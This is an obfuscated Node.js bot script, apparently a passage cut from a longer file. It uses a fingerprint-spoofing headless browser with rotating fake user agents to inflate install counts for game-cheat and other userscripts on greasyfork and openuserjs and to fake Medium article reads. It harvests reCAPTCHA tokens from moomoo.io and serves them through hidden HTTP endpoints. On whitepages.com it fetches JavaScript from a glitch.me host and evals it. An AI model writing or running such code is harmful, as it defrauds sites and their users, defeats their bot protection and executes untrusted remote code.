      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + V(0x14) + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x18) + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x2) + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + V(0x15),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x16) + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + T(0x1, 'o&Py') + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': T(0x12, 'y%l)') + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    T(0x4, 'BO$v') + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    T(0x19, 'mcKp') + 'dium.com/@' + W(0xd) + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1b73 * -0x1 + -0xdd5 * 0x2 + 0x371d
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xf * -0x25c + 0x1d09 + 0x1 * 0x65b)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const X = c;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios[X(0x1a)](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x16e + 0x474 + 0x25 * -0x26), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xf9b + -0x2 * 0x76d + 0x35 * 0x95), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x6ae * 0x3 + -0x20f4 + 0x34fe;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x2309 + 0x254 + 0x1 * 0x20b5; w < getRandomInt(0x2644 + -0x2 * 0x9f7 + -0x1255 * 0x1, -0xc * -0x259 + 0x10ec + -0xb * 0x419); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1a668 + -0x2d1f + -0x10f * 0x87);
        }
      }();
    }, 0x25c9 + -0x1b05 * 0x1 + 0x530 * -0x2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0xcce + 0xa7b * 0x2 + -0x828;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y[Y(0x9)](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xde7 * 0x2 + -0x1c58 + 0x6 * 0x17, 0xcae + 0x4f * -0x27 + -0x73)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xd598 + 0xe24e + -0x142b6);
    }, 0xb * -0x79 + 0x11 * -0x1ef + -0x9 * -0x446), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1 * -0x6df + -0x2 * 0x368 + 0xdaf * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2bb * 0xb + -0x49 * 0x53 + -0x416c * -0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * -0x1afb + 0x25e7 + -0x3 * 0x3a4), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xf326c + -0x1f * -0x6acf + -0xe65dd);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1893 + -0x221d + 0x3b14);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x22a1 + -0x1750 + -0xa89 * 0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1 * -0x2d71 + 0x2e5a + 0x1ea7);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b;
  async function f() {
    const a1 = d,
      Z = b,
      k = h[Z(0x1b, '1efK')](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x198c + -0xbdc + 0x1 * -0xdaf) {
        const a0 = c;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf'](a0(0xa)) + 'Firefox' ['length'] + (-0x2 * 0xec3 + -0x221 * -0x1 + 0x1b66));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x10fa + 0x77b * -0x3 + -0x276b * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1f09 + 0x7f * -0x4d + 0x453c, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1b59 * -0x1 + 0x44 * 0xe3 + -0x3095),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + a1(0x6),
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1 * -0x2b3f + -0x1 * 0x3401 + 0x2fd2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': a1(0xf) + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + a2(0x5, ']@y)') + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2 * -0x1e + -0x1 * 0x204a + -0x1043 * -0x2; k < -0x1d62 * 0x1 + -0x1e7 * -0x6 + 0x11fc; k++)
    setTimeout(f, (-0x15b67 + 0xca7 * -0x11 + 0x18e6f * 0x2) * k * getRandomInt(0x4 * -0x33d + 0x13 * 0xdf + -0x398, 0x86 + 0x1928 + -0x19ab));
  setInterval(() => {
    f();
